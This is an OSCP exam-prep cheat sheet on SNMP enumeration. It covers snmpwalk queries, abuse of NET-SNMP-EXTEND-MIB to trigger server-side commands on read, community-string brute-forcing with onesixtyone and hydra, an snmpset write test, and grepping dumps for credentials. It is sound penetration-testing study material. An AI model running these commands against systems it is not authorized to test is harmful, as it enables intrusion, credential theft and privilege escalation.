
# SNMPWalk & MIB Enumeration – OSCP Cheat Sheet

## 1. Install SNMP & MIB Support (Kali / Debian)

```bash
sudo apt update
sudo apt install snmp snmp-mibs-downloader -y
```

Enable loading of downloaded MIBs:

```bash
sudo sed -i 's/^mibs :/# mibs :/g' /etc/snmp/snmp.conf
```

Restart shell after this.

---

## 2. Basic SNMP Version & Community Enumeration

Try common community strings:

```bash
snmpwalk -v1 -c public 192.168.1.10
snmpwalk -v2c -c public 192.168.1.10
snmpwalk -v2c -c private 192.168.1.10
```

If this works → SNMP is exposed anonymously.

---

## 3. Useful Core OIDs for Initial Enumeration

### System Info

```bash
snmpwalk -v2c -c public 192.168.1.10 sysDescr
snmpwalk -v2c -c public 192.168.1.10 sysName
snmpwalk -v2c -c public 192.168.1.10 sysContact
snmpwalk -v2c -c public 192.168.1.10 sysLocation
```

### Running Processes

```bash
snmpwalk -v2c -c public 192.168.1.10 hrSWRunName
snmpwalk -v2c -c public 192.168.1.10 hrSWRunPath
snmpwalk -v2c -c public 192.168.1.10 hrSWRunParameters
```

### Network Interfaces

```bash
snmpwalk -v2c -c public 192.168.1.10 ifDescr
snmpwalk -v2c -c public 192.168.1.10 ipAdEntAddr
```

---

## 4. Enumerating Installed MIB Modules

List which MIBs respond:

```bash
snmpwalk -v2c -c public 192.168.1.10 .1
```

Check if Net-SNMP Extend MIB is enabled:

```bash
snmpwalk -v2c -c public 192.168.1.10 nsExtendObjects
```

If results appear → **remote command execution via SNMP is likely active.**

---

## 5. NET-SNMP-EXTEND-MIB Abuse (HIGH VALUE)

This MIB exposes **server-side scripts and commands**.

### Enumerate All Extended Commands

```bash
snmpwalk -v2c -c public 192.168.1.10 nsExtendObjects
```

### Example Output Explained

```text
NET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 = INTEGER: 1
NET-SNMP-EXTEND-MIB::nsExtendCommand."RESET" = STRING: ./home/john/RESET_PASSWD
NET-SNMP-EXTEND-MIB::nsExtendArgs."RESET" = STRING:
NET-SNMP-EXTEND-MIB::nsExtendInput."RESET" = STRING:
NET-SNMP-EXTEND-MIB::nsExtendCacheTime."RESET" = INTEGER: 5
NET-SNMP-EXTEND-MIB::nsExtendExecType."RESET" = INTEGER: exec(1)
NET-SNMP-EXTEND-MIB::nsExtendRunType."RESET" = INTEGER: run-on-read(1)
NET-SNMP-EXTEND-MIB::nsExtendStorage."RESET" = INTEGER: permanent(4)
NET-SNMP-EXTEND-MIB::nsExtendStatus."RESET" = INTEGER: active(1)
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."RESET" = STRING: Resetting password of kiero to the default value
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."RESET" = STRING: Resetting password of kiero to the default value
NET-SNMP-EXTEND-MIB::nsExtendOutNumLines."RESET" = INTEGER: 1
NET-SNMP-EXTEND-MIB::nsExtendResult."RESET" = INTEGER: 0
NET-SNMP-EXTEND-MIB::nsExtendOutLine."RESET".1 = STRING: Resetting password of kiero to the default value
```

Key takeaways:

- `"RESET"` = command alias
- `nsExtendCommand` = full script path
- `run-on-read(1)` = command executes when queried
- `nsExtendOutput*` = may leak sensitive info (password resets, etc.)

---

## 6. Triggering Remote Commands via SNMP

Once an extend entry exists, **just reading it executes it**:

```bash
snmpwalk -v2c -c public 192.168.1.10 nsExtendOutputFull."RESET"
```

Useful OIDs:

```bash
snmpwalk -v2c -c public 192.168.1.10 nsExtendResult."RESET"
snmpwalk -v2c -c public 192.168.1.10 nsExtendOutLine."RESET"
snmpwalk -v2c -c public 192.168.1.10 nsExtendOutNumLines."RESET"
```

This can:

- Reset passwords
- Execute scripts as root
- Leak sensitive output
- Lead directly to privilege escalation

---

## 7. Raw OID Access (When MIB Names Don’t Work)

If MIBs fail to resolve:

```bash
snmpwalk -v2c -c public 192.168.1.10 1.3.6.1.4.1.8072.1.3
```

Important Extend OIDs:

- `1.3.6.1.4.1.8072.1.3.2` → Command
- `1.3.6.1.4.1.8072.1.3.3` → Args
- `1.3.6.1.4.1.8072.1.3.4` → Output

---

## 8. Brute-Forcing Community Strings

```bash
onesixtyone -c community.txt 192.168.1.10
hydra -P community.txt 192.168.1.10 snmp
```

Common strings:

```text
public
private
manager
admin
cisco
monitor
```

---

## 9. Write Access Test (SNMP-SET)

If write access exists → this is game over.

```bash
snmpset -v2c -c private 192.168.1.10 sysName.0 s "pwned"
```

If this works, you may be able to:

- Add new extend commands
- Modify services
- Achieve RCE instantly

---

## 10. OSCP Attack Checklist

- [ ] Try `public` and `private` community strings
- [ ] Dump `sysDescr` for OS & version
- [ ] Enumerate processes via `hrSWRun*`
- [ ] Enumerate network interfaces (`ifDescr`, `ipAdEntAddr`)
- [ ] Check `nsExtendObjects` for extend entries
- [ ] Trigger `nsExtendOutputFull` on each alias
- [ ] Look for password resets or credential leaks
- [ ] Test `snmpset` write access
- [ ] Save full SNMP walk for offline analysis

---

## 11. One-Liner Full Dump

```bash
snmpwalk -v2c -c public 192.168.1.10 > snmp_full_dump.txt
```

Use grep/less to search for interesting strings:

```bash
grep -iE "pass|user|admin|root|ssh|key" snmp_full_dump.txt
```

---

## 12. Common OSCP Findings from SNMP

- Cleartext credentials in script paths or arguments
- Backup or maintenance scripts that reset passwords
- Cron-like behavior via `run-on-read` commands
- Internal network mapping (interfaces, IPs, routes)
- Information for lateral movement & pivoting
- Direct RCE via NET-SNMP-EXTEND-MIB

---
